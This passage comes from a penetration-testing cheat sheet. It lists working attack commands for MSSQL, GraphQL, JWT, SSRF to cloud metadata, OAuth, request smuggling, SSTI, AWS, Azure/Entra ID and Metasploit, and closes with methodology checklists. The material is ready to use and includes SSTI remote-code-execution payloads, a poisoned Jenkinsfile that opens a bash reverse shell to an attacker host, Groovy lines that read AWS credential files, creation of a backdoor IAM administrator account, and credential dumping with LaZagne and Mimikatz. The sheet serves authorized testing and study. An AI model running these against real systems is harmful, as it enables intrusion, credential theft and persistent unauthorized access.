EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### NetExec MSSQL Module
```bash
netexec mssql <IP> -u <USER> -p <PASS>
netexec mssql <IP> -u <USER> -p <PASS> --local-auth
netexec mssql <IP> -u <USER> -p <PASS> -q "SELECT SYSTEM_USER"
netexec mssql <IP> -u <USER> -p <PASS> -x "whoami"    # xp_cmdshell
netexec mssql <IP>/24 -u <USER> -p <PASS>              # sweep network
```

---

## 21. Modern Web Attacks

> **Concept:** Beyond classic SQLi/XSS, modern assessments require testing GraphQL, JWT, SSRF, OAuth, and HTTP smuggling. These are increasingly common in cloud-native and microservice architectures.

### GraphQL Enumeration & Attacks
```bash
# Introspection query — dump full schema
curl -X POST http://<IP>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}"}'

# InQL Burp extension — automatic schema analysis
# Or use graphql-cop for security checks
pip3 install graphql-cop
graphql-cop -t http://<IP>/graphql

# Introspection disabled? Try field suggestion (clairvoyance)
pip3 install clairvoyance
clairvoyance -u http://<IP>/graphql -o schema.json -w wordlist.txt

# Batching attack (bypass rate limits)
curl -X POST http://<IP>/graphql -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"admin\",pass:\"pass1\")}"},
       {"query":"mutation{login(user:\"admin\",pass:\"pass2\")}"}]'
```

### JWT Attacks
```bash
# Decode JWT (no verification)
echo '<JWT_PAYLOAD>' | base64 -d 2>/dev/null

# Algorithm confusion: none algorithm
# Change "alg":"RS256" → "alg":"none", remove signature, keep trailing dot
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"

# Crack HS256 secret
hashcat -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
# Or with jwt_tool
pip3 install jwt_tool
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# jwt_tool — all attacks
jwt_tool <TOKEN> -M pb        # playbook scan (all attacks)
jwt_tool <TOKEN> -X a         # alg:none
jwt_tool <TOKEN> -X s         # HS/RS256 key confusion
jwt_tool <TOKEN> -T           # tamper (interactive)
```

### SSRF (Server-Side Request Forgery)
```bash
# Basic test — internal services
http://<TARGET>/fetch?url=http://127.0.0.1/
http://<TARGET>/fetch?url=http://127.0.0.1:22/
http://<TARGET>/fetch?url=http://127.0.0.1:6379/    # Redis

# Cloud metadata endpoints — always test on cloud targets
http://169.254.169.254/latest/meta-data/                      # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/computeMetadata/v1/                    # GCP (need header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure

# AWS IMDSv2 (token-based — harder to exploit)
# Step 1: get token
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: use token
curl http://169.254.169.254/latest/meta-data/ \
  -H "X-aws-ec2-metadata-token: <TOKEN>"

# Bypass filters
http://0177.0.0.1/          # octal
http://0x7f000001/          # hex
http://[::1]/               # IPv6 loopback
http://spoofed.domain/      # DNS rebinding
http://127.1/               # short form

# SSRF to internal port scan (time-based)
ffuf -u "http://<TARGET>/fetch?url=http://127.0.0.1:FUZZ/" \
  -w <(seq 1 65535) -fs <normal_response_size>
```

### OAuth Misconfigurations
```bash
# Open redirect_uri → steal auth code
# Manipulate redirect_uri parameter to attacker-controlled domain
GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.com&response_type=code

# State parameter missing → CSRF attack (force victim to link attacker's account)

# Implicit flow token leakage — token in URL fragment → Referer header leak

# Token scope escalation — request additional scopes beyond what app normally requests
GET /oauth/authorize?...&scope=openid%20email%20admin
```

### HTTP Request Smuggling
```bash
# Test with smuggler.py
pip3 install requests
python3 smuggler.py -u https://<TARGET>/

# Manual CL.TE test (Content-Length takes priority at front-end, Transfer-Encoding at back-end)
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# Detect via timing — TE.CL (Transfer-Encoding at front, Content-Length at back)
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

### SSTI (Server-Side Template Injection)
```bash
# Detection payloads — inject into all input fields
{{7*7}}          # → 49  (Jinja2, Twig)
${7*7}           # → 49  (Freemarker, Thymeleaf)
<%= 7*7 %>       # → 49  (ERB)
#{7*7}           # → 49  (Ruby)
*{7*7}           # → 49  (Spring)

# Jinja2 RCE (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig RCE (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker RCE (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Use tplmap for automated detection/exploitation
python3 tplmap.py -u "http://<IP>/page?input=*"
```

---

## 22. AWS Cloud Attacks

> **Concept:** CI/CD pipelines often have excessive IAM permissions. Common attack chain: misconfigured S3 → leaked Git credentials → Jenkins pipeline access → IAM credential theft → privilege escalation.

### Setup & Identity
```bash
export AWS_ACCESS_KEY_ID=<KEY>
export AWS_SECRET_ACCESS_KEY=<SECRET>
export AWS_DEFAULT_REGION=us-east-1

aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name <USER>
aws iam list-user-policies --user-name <USER>
```

### IAM Enumeration
```bash
aws iam list-users
aws iam list-groups
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-policy --policy-arn <ARN>
aws iam get-policy-version --policy-arn <ARN> --version-id v1

# Check effective permissions
aws iam simulate-principal-policy --policy-source-arn <USER_ARN> --action-names "s3:GetObject"
```

### S3 Enumeration & Exploitation
```bash
# List buckets
aws s3 ls

# List bucket contents
aws s3 ls s3://<bucket-name>
aws s3 ls s3://<bucket-name> --recursive

# Download
aws s3 cp s3://<bucket>/<file> ./
aws s3 sync s3://<bucket> ./local_dir/

# Check public access (unauthenticated)
curl https://<bucket>.s3.amazonaws.com/
aws s3 ls s3://<bucket> --no-sign-request

# Write to bucket (if writable)
aws s3 cp malicious.html s3://<bucket>/malicious.html
```

### Jenkins Enumeration
```bash
# Unauthenticated endpoints
curl -s http://<JENKINS_IP>:8080/api/json?pretty=true
curl -s http://<JENKINS_IP>:8080/asynchPeople/api/json

# MSF scanner
use auxiliary/scanner/http/jenkins_enum
set RHOSTS <IP>; set RPORT 8080; run

# Script console (if accessible — Groovy)
println "id".execute().text
println System.getenv("AWS_ACCESS_KEY_ID")
println new File("/root/.aws/credentials").text
println new File("/var/lib/jenkins/.aws/credentials").text
```

### Poisoning the Pipeline (Jenkinsfile)
```groovy
pipeline {
  agent any
  stages {
    stage('ReverseShell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" &'
            }
          }
        }
      }
    }
  }
}
```

### Git Secret Hunting
```bash
# Gitleaks
gitleaks detect --source ./repo -v

# Manual git log inspection
git log --all --full-history --oneline
git show <COMMIT_HASH>
git diff <COMMIT1> <COMMIT2>

# truffleHog
trufflehog git file://./repo --only-verified
```

### Backdoor IAM Account
```bash
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor
```

---

## 23. Azure / Entra ID Attacks

> **Concept:** Azure/Entra ID (formerly Azure AD) is the cloud identity plane for most modern enterprises. Attack paths mirror on-prem AD but use REST APIs and OAuth tokens instead of Kerberos/LDAP. Key tools: `az cli`, `AADInternals`, `ROADtools`, `GraphRunner`, `TokenTactics`.

### Setup & Enumeration
```bash
# Azure CLI login
az login
az login --use-device-code                    # for non-browser environments

# Identity
az account show
az ad signed-in-user show

# Enumerate users, groups, apps
az ad user list --output table
az ad group list --output table
az ad app list --output table
az ad sp list --output table                  # service principals

# Check role assignments
az role assignment list --all --output table
az role assignment list --assignee <USER_UPN>
```

### AADInternals (PowerShell — Most Powerful Azure Recon Tool)
```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals

# Tenant recon (no auth needed)
Invoke-AADIntReconAsOutsider -DomainName target.com | Format-Table

# Get OAuth tokens
$cred = Get-Credential
Get-AADIntAccessTokenForMSGraph -Credentials $cred

# Enumerate as user
Get-AADIntUsers | Select UserPrincipalName,ObjectId
Get-AADIntGroups
Get-AADIntApplications
Get-AADIntConditionalAccessPolicies

# Extract sync credentials (if Azure AD Connect is present)
Get-AADIntSyncCredentials          # dump MSOL account creds → full AD sync rights
```

### ROADtools (Python — Offline Azure Enum)
```bash
pip3 install roadtools

# Authenticate and dump tenant data
roadrecon auth -u <USER> -p <PASS>
roadrecon gather                   # dump all Azure objects to SQLite DB
roadrecon gui                      # browse data in web UI at http://127.0.0.1:5000
```

### Token-Based Attacks
```bash
# Request token for Microsoft Graph
curl -X POST https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token \
  -d "grant_type=password&client_id=1950a258-227b-4e31-a9cf-717495945fc2\
&scope=https://graph.microsoft.com/.default\
&username=<USER>&password=<PASS>"

# Use token — enumerate users via Graph API
curl https://graph.microsoft.com/v1.0/users \
  -H "Authorization: Bearer <TOKEN>"

# Enumerate group memberships
curl https://graph.microsoft.com/v1.0/me/memberOf \
  -H "Authorization: Bearer <TOKEN>"

# Device code phishing (no password needed — social engineering)
az login --use-device-code
# → Send device code URL to victim → steal their token on your CLI
```

### Managed Identity Abuse (from Compromised Azure VM/Function)
```bash
# From inside an Azure resource — request token via IMDS (no creds needed)
curl 'http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true

# Extract token and use with az cli
TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# List subscriptions with the managed identity token
curl https://management.azure.com/subscriptions?api-version=2020-01-01 \
  -H "Authorization: Bearer $TOKEN"

# Storage account access via managed identity
TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01&resource=https://storage.azure.com/' \
  -H Metadata:true | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
curl "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list" \
  -H "Authorization: Bearer $TOKEN" -H "x-ms-version: 2019-12-12"
```

### Pass-the-PRT (Primary Refresh Token)
```powershell
# PRT is a long-lived token on Azure AD-joined/hybrid Windows devices
# Extract PRT with AADInternals (requires local admin)
Import-Module AADInternals
$prt = Get-AADIntUserPRTToken
$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt

# Use ROADtoken or BrowserCookieExtract to extract from browser
```

### Azure Privilege Escalation Checklist
```
[ ] Check for Owner/Contributor roles on subscriptions → full resource access
[ ] Check for Global Administrator / Privileged Role Administrator in Entra ID
[ ] Enumerate App Registrations with secrets → impersonate applications
[ ] Look for Azure AD Connect server → compromise = full domain sync rights
[ ] Check for Key Vault access → secrets, certificates, keys
[ ] Enumerate Automation Accounts with RunAs → often Contributor on subscription
[ ] Check Logic Apps / Function Apps for embedded credentials
[ ] Managed Identity → what resources can it access?
```

---

## 24. Metasploit Framework

> **Concept:** Metasploit organizes modules as: Auxiliary (scan/enum) → Exploit → Payload. Use `run -j` to background sessions. Stages payloads need `multi/handler` — never plain netcat.

### Setup
```bash
sudo msfdb init
sudo systemctl enable postgresql
msfconsole
db_status
workspace -a pentest
```

### Search & Use
```bash
search type:auxiliary smb
search type:exploit cve:2017-0144
search jenkins
use <module_path>
info
show options
set RHOSTS <IP>
set LHOST <LHOST>
set LPORT <LPORT>
run         # foreground
run -j      # background as job
jobs        # list jobs
sessions -l
sessions -i <ID>
```

### DB Commands
```bash
db_nmap -A <IP>
hosts
services
vulns
creds
```

### Post-Exploitation (Meterpreter)
```
help
sysinfo; getuid; getpid
shell                    # drop to OS shell
ps                       # list processes
migrate <PID>            # migrate to another process
execute -H -f notepad    # spawn hidden process then migrate
getsystem                # auto-privesc (SeImpersonate / debug)
hashdump                 # SAM hashes (needs SYSTEM)
load kiwi                # mimikatz integration (needs SYSTEM)
kiwi_cmd sekurlsa::logonpasswords
upload /path/local /path/remote
download /path/remote
lcd /home/kali/Downloads
lcat /home/kali/Downloads/file
```

### Pivoting with Metasploit
```bash
route add <SUBNET>/24 <SESSION_ID>
route print
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j
use multi/manage/autoroute
set SESSION <ID>
run
```

### UAC Bypass via MSF
```bash
use exploit/windows/local/bypassuac_sdclt
set SESSION <ID>
run
```

---

## 25. General Utilities & Modern Tooling

### File Transfer

**From Kali → Victim (Linux)**
```bash
python3 -m http.server 8080
# On victim:
wget http://<KALI_IP>:8080/<file>
curl -O http://<KALI_IP>:8080/<file>
```

**From Kali → Victim (Windows)**
```powershell
(New-Object Net.WebClient).DownloadFile('http://<KALI_IP>/<file>','C:\Temp\<file>')
powershell -c "wget http://<KALI_IP>/<file> -OutFile C:\Temp\<file>"
curl.exe -o C:\Temp\file.exe http://<KALI_IP>/file.exe
curl.exe -C - -o C:\Temp\file.exe http://<KALI_IP>/file.exe   # resume
certutil -urlcache -split -f http://<KALI_IP>/<file> C:\Temp\<file>
```

**Victim → Kali**
```bash
# nc receive
nc -nlvp 9001 > received_file
nc <KALI_IP> 9001 < file_to_send

# impacket SMB server
impacket-smbserver share ./share -smb2support
# On victim:
copy C:\file.txt \\<KALI_IP>\share\
```

### Remote Access
```bash
xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /cert-ignore /drive:local,/home/kali /dynamic-resolution +clipboard
ssh <USER>@<IP>
ssh -i keyfile -p 2222 <USER>@<IP> -L 8080:localhost:80
evil-winrm -i <IP> -u <USER> -p <PASS>
evil-winrm -i <IP> -u <USER> -H <NTHASH>
```

### Ligolo-ng (Modern Tunneling — Faster than Chisel)
```bash
# Kali: download agent + proxy
# https://github.com/nicocha30/ligolo-ng/releases

# Kali: setup tun interface and start proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim: connect agent to Kali
./agent -connect <KALI_IP>:11601 -ignore-cert        # Linux
agent.exe -connect <KALI_IP>:11601 -ignore-cert      # Windows

# Kali ligolo-ng console: start tunnel
session          # select session
start            # start tunnel

# Add route to internal subnet on Kali
sudo ip route add 10.10.10.0/24 dev ligolo

# Now access internal hosts directly from Kali
nmap -sT 10.10.10.5
netexec smb 10.10.10.5 -u admin -p pass

# Listener for reverse shells FROM internal hosts
# In ligolo-ng console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# On internal host: connect back to pivot_ip:4444
# Shell arrives on Kali:4444
```

### Kerbrute — Kerberos User Enum & Spray
```bash
# Download: https://github.com/ropnop/kerbrute

# Enumerate valid users (no lockout risk — AS-REQ doesn't lock)
./kerbrute userenum -d corp.com --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spray (careful — DOES lockout after threshold)
./kerbrute passwordspray -d corp.com --dc <DC_IP> users.txt 'Password123!'

# Brute single user
./kerbrute bruteuser -d corp.com --dc <DC_IP> /usr/share/wordlists/rockyou.txt <USER>
```

### LaZagne — Local Credential Extraction
```bash
# Windows — extract all stored creds
.\lazagne.exe all
.\lazagne.exe browsers            # browser saved passwords
.\lazagne.exe sysadmin            # WinSCP, PuTTY, FileZilla etc
.\lazagne.exe windows             # Windows credential manager

# Linux
python3 laZagne.py all
python3 laZagne.py browsers
```

### NetExec — Full Cheatsheet
```bash
# SMB
netexec smb <IP> -u <USER> -p <PASS> --shares
netexec smb <IP> -u <USER> -p <PASS> --sam
netexec smb <IP> -u <USER> -p <PASS> --lsa
netexec smb <IP> -u <USER> -p <PASS> --laps
netexec smb <IP> -u <USER> -p <PASS> -x "whoami" --exec-method smbexec
netexec smb <IP> -u <USER> -p <PASS> --spider C$ --pattern "password|secret|cred"
netexec smb <IP>/24 -u <USER> -p <PASS> --continue-on-success  # spray subnet

# WinRM
netexec winrm <IP> -u <USER> -p <PASS> -x "whoami"

# LDAP
netexec ldap <DC_IP> -u <USER> -p <PASS> --users
netexec ldap <DC_IP> -u <USER> -p <PASS> --groups
netexec ldap <DC_IP> -u <USER> -p <PASS> --asreproast asrep.txt
netexec ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting kerb.txt
netexec ldap <DC_IP> -u <USER> -p <PASS> --bloodhound -c All

# MSSQL
netexec mssql <IP> -u <USER> -p <PASS> -x "whoami"
netexec mssql <IP> -u <USER> -p <PASS> -q "SELECT @@version"

# SSH / RDP
netexec ssh <IP>/24 -u <USER> -p <PASS>
netexec rdp <IP>/24 -u <USER> -p <PASS>

# Screenshots (RDP — great for quick recon)
netexec smb <IP>/24 -u <USER> -p <PASS> --screenshot
```

### Custom Wordlist Generation
```bash
crunch 8 8 -t Lab@%%%% > wordlist.txt
cewl http://<TARGET>/ -d 3 -m 5 -w cewl.txt
# Username format generation
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy "John Smith" > usernames.txt
```

### Session Logging (tmux)
```bash
# Log everything in tmux session — critical for reporting evidence
tmux new -s pentest
# Inside tmux — enable pipe-pane logging
Ctrl+b then :
pipe-pane -o "cat >> ~/logs/$(date +%Y%m%d_%H%M%S).log"

# Alternative — script command
script -a -t 2> ~/timing.log ~/session.log
```

### Wordlists
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/
/usr/share/seclists/Usernames/
/usr/share/wordlists/dirbuster/
/usr/share/hashcat/rules/
```

### Payloads & References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFOBins (Linux): https://gtfobins.github.io
- LOLBAS (Windows): https://lolbas-project.github.io
- HackTricks: https://book.hacktricks.xyz
- RevShells generator: https://www.revshells.com
- Certipy (ADCS): https://github.com/ly4k/Certipy
- WADComs (AD cheatsheet): https://wadcoms.github.io
- ired.team notes: https://www.ired.team

---

## Quick Methodology Checklists

### Initial Foothold
```
[ ] nmap -sC -sV -v <IP>  (top 1000 TCP)
[ ] sudo nmap -sU -F <IP> (top 100 UDP)
[ ] gobuster / feroxbuster on all web ports
[ ] nikto / nuclei
[ ] searchsploit on identified versions
[ ] check for default creds on all services
[ ] enum4linux-ng / smbclient on 139/445
[ ] snmpwalk on 161/udp if open
```

### Post-Exploitation (Linux)
```
[ ] id; sudo -l; uname -a
[ ] linpeas.sh
[ ] find SUID binaries
[ ] cat crontab files
[ ] search for passwords in files/history
[ ] check capabilities (getcap -r /)
[ ] check /etc/passwd for write access
[ ] LaZagne for stored creds
```

### Post-Exploitation (Windows)
```
[ ] whoami /priv; whoami /groups
[ ] winPEAS.exe / Seatbelt.exe
[ ] check SeImpersonatePrivilege → Potato
[ ] check unquoted service paths
[ ] check scheduled tasks
[ ] check PS history / transcript files
[ ] check HKLM for AlwaysInstallElevated
[ ] LaZagne for stored creds
[ ] check for LAPS passwords if domain-joined
```

### AD Attack Chain
```
[ ] BloodHound collection (SharpHound / netexec --bloodhound)
[ ] Kerbrute user enumeration
[ ] Kerberoasting (any valid user)
[ ] AS-REP Roasting (no creds needed)
[ ] Spray passwords with Kerbrute / netexec (check lockout first)
[ ] Check GPP passwords in SYSVOL
[ ] Check ACLs (GenericAll/GenericWrite/WriteDACL)
[ ] LAPS enumeration
[ ] Check delegation (unconstrained/constrained/RBCD)
[ ] Check ADCS — certipy find -vulnerable
[ ] mitm6 + ntlmrelayx (if IPv6 on network)
[ ] Coercer / PetitPotam for hash capture
[ ] Lateral movement to admin host
[ ] Dump LSASS / SAM (Mimikatz / netexec --sam)
[ ] DCSync (DA required)
[ ] Golden ticket for persistence
[ ] ADCS persistence (cert valid even after password change)
```

### Modern Web Assessment
```
[ ] Directory brute (gobuster / feroxbuster)
[ ] Technology fingerprint (Wappalyzer / whatweb)
[ ] Check robots.txt, sitemap.xml, /.git, /.env
[ ] Burp Suite active scan
[ ] SQLi on all parameters (manual + sqlmap)
[ ] XSS on all reflected inputs
[ ] SSTI detection on template-heavy apps
[ ] SSRF — test URL parameters + cloud metadata
[ ] JWT attacks (jwt_tool -M pb)
[ ] GraphQL introspection (if GraphQL endpoint)
[ ] File upload bypass attempts
[ ] OAuth redirect_uri manipulation
[ ] HTTP request smuggling (smuggler.py)
```

### Cloud (AWS) Assessment
```
[ ] aws sts get-caller-identity
[ ] Enumerate IAM permissions
[ ] S3 bucket enumeration (public + authenticated)
[ ] EC2 metadata service (IMDS) from any EC2 instance
[ ] Secrets Manager / Parameter Store enumeration
[ ] Lambda environment variables
[ ] CloudTrail / CloudWatch for stealth awareness
[ ] Check for overprivileged IAM roles on compute resources
```
